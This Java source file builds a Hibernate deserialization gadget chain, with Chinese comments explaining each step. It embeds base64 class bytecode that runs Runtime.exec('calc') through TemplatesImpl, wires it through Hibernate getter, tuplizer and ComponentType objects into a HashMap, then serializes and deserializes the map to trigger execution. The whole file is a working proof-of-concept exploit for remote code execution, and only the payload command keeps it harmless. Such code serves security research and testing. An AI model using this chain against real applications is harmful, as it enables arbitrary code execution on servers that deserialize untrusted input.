package hibernate;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.type.Type;
import util.utils;

import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;

public class hibernate {
    public static void main(String[] args) throws Exception {

        Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");

        String calc = "yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMdGVzdDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAAR0ZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAJAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAWAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAbAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADQAJABAADAAOAA0ADwAWABEADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==";

        // 生成包含恶意类字节码的 TemplatesImpl 类
        TemplatesImpl tmpl   = utils.getTeml(Base64.getDecoder().decode(calc));
        Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?>       getterImpl  = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, method);
        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?>       basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(tmpl.getClass(), method, "outputProperties");
        }

        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        AbstractComponentTuplizer tuplizer = (AbstractComponentTuplizer) utils.createInstanceUnsafely(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = utils.createInstanceUnsafely(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        utils.setFieldValue(type,"componentTuplizer",tuplizer);

        utils.setFieldValue(type,"propertySpan",1);

        utils.setFieldValue(type,"propertyTypes",new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "123");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        utils.setFieldValue(typedValue,"value", tmpl);

        byte[] ser = utils.serialize(hashMap);
        utils.unserialize(ser);
    }
}
